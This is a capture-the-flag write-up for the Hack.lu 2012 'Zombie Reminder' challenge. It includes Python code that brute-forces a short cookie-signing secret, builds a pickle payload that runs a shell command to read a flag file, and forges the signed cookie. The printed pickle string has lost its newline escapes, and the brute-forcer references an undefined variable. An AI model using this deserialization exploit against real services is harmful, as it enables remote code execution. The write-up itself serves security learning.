---
title: '[writeup] Hacklu 2012 &#8211; Challenge #19 &#8211; Zombie Reminder &#8211; (200)'
author: pdah
layout: post

aktt_notify_twitter:
  - no
shorturls:
  - 'a:0:{}'
tweetbackscheck:
  - 1408358963
category: ctf - clgt crew
tags:
  - '2012'
  - CTF
  - Hacklu
  - Python Pickle
---
> 19 &#8211; Zombie Reminder  
> Zombies love brains. But zombies forget, so they have a tool where they can enter the location of brains they found. In a heroic mission someone managed to obtain both the source code and the information that a critical file can be found at &#8216;/var/www/flag&#8217;.  
> Your mission is to obtain the contents of this file by any means and avenge your fallen friend!  
> Service: https://ctf.fluxfingers.net:2073/  
> Source: https://ctf.fluxfingers.net/challenges/zombie_reminder.py

This challenge is a web application returning an arbitrary text that inputed by you previously. Your input is stored in &#8220;location&#8221; cookie with format of &#8220;**<hash\_digest>!<encoded\_input>**&#8221; where:

*   encoded\_input = base64\_encode(pickle.dumps(your_input))
*   hash\_digest = sha256(encoded\_input+secret_key)
  
When you go back to the main page, if a valid cookie is set the application will load the pickle object from cookie and print it out.</p> <pre class="brush: plain; title: ; notranslate" title="">location = pickle.loads(b64d(location))
</pre>

The purpose of hash\_digest is to ensure that your\_input is a **string** submitted through challenge&#8217;s web form. However this design has 2 major flaws:

*   secret_key is too short (5 characters)
*   pickle has a known security issue (<http://nadiana.com/python-pickle-insecure>)

We submit a random string (let&#8217;s say &#8220;test&#8221;) and look at the cookie:  
location=&#8221;04b098d726754c810c65595a82dd42a9564ce332fd51c0da2a43bbdd42a91f37!VnRlc3QKcDAKLg==&#8221;

We use this script to bruteforce the secret key :

<pre class="brush: plain; title: ; notranslate" title="">#!/usr/bin/env python

import multiprocessing
from hashlib import *
import string
import sys

s = string.ascii_letters + string.digits
location = "VnRlc3QKcDAKLg=="
digest = "04b098d726754c810c65595a82dd42a9564ce332fd51c0da2a43bbdd42a91f37"

print len(s)

WORKERS    = 8

def worker(start,end):

    for i1 in s[start:end]:
        for i2 in s:
            for i3 in s:
                for i4 in s:
                    for i5 in s:
                        secret  = i1+i2+i3+i4+i5

                        if sha256("%s%s" % (location, secret)).hexdigest() == digest:
                            print "*******", secret
                            sys.exit(0)

def main():

    ps = []
    for i in range(WORKERS):
        if i == WORKERS -1:
            tmp = multiprocessing.Process(target=worker, args=(i*(len(s)/WORKERS),len(s),))
        else:
            tmp = multiprocessing.Process(target=worker, args=(i*(len(s)/WORKERS),(i+1)*(len(s)/WORKERS),))
        tmp.start()
        ps.append(tmp)

    for p in ps:
        p.join()

    return jobs.empty()

if __name__ == '__main__':
    main()
</pre>

After a few minutes we managed to find the key **oIqxe**. Our next task is to build a pickled representation of a python code object, the goal is to execute a code similar to this when pickle.loads() is called:

<pre class="brush: plain; title: ; notranslate" title="">__import__("commands").getoutput("cat /var/www/flag")
</pre>

This code is used to generate such serialized string:

<pre class="brush: plain; title: ; notranslate" title="">import pickle, new

def nasty(module, function, *args):
        return pickle.dumps(new.classobj(function, (), {'__getinitargs__': lambda self, arg = args: arg, '__module__': module}) ())

t = nasty("commands", "getoutput", "cat /var/www/flag")

print repr(t)

# Output: "(S'cat /var/www/flag'np1nicommandsngetoutputnp2n(dp3nb."
</pre>

Now we have everything to get the flag, time to build a valid cookie:

<pre class="brush: plain; title: ; notranslate" title="">from hashlib import sha256
import base64
b64e=base64.b64encode

secret = 'oIqxe'
location = b64e("(S'cat /var/www/flag'np1nicommandsngetoutputnp2n(dp3nb.")

cookie = "%s!%s" % (sha256("%s%s" % (location, secret)).hexdigest(), location)

print cookie
</pre>

Place this cookie into your browser (don&#8217;t ask us how to do that lolz) and refresh, the flag will be right on the screen.

> Hello, here is what we remember for you. If you want to change, delete or extend it, click below  
> 08ac40047dae3f6a36471d768dfcb1b7a8e18fb8